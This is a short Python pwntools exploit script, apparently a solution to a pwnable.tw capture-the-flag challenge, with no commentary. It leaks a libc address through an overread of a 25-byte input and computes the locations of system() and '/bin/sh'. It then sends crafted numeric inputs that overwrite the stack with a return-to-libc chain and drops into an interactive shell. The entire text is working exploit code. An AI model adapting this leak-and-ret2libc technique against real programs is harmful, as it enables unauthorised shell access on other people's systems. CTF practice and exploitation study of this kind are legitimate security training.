from pwn import *
import re
context(arch='i386',log_level='debug')
p = remote('chall.pwnable.tw', 10101)
libc = ELF('./libc_32.so.6')
p.recvuntil(':')

p.send('A' * 25)
s = p.recvuntil(':')
addr = s[31:34]
print addr
addr_leak = u32('\x00' + addr)
addr_libc = addr_leak - 0x1b0000
addr_system = addr_libc + libc.symbols['system']
p.sendline('35')
p.send('0\n' * 24)
p.sendline('+')
p.send((str(addr_system) + '\n') * 8)
addr_shell = addr_libc + 0x00158E8B
print hex(addr_shell)
p.sendline(str(addr_shell)) 
p.sendline(str(addr_shell))
p.interactive()